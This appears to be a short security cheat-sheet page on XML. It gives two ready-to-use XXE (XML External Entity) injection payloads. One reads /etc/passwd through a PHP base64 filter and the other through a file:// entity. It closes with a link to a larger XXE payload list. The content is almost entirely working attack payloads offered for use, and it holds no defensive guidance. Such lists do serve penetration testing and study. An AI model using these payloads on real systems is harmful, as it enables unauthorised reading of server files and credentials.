# XML

XML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable.

## XXE (XML External Entity)

Read `/etc/passwd` file with PHP

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<foo>
    <response>&file;</response>
</foo>
```

Read `/etc/passwd` flat

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<foo>
    <response>&file;</response>
</foo>
```

## Links

- [XXE Injection](https://github.com/payloadbox/xxe-injection-payload-list)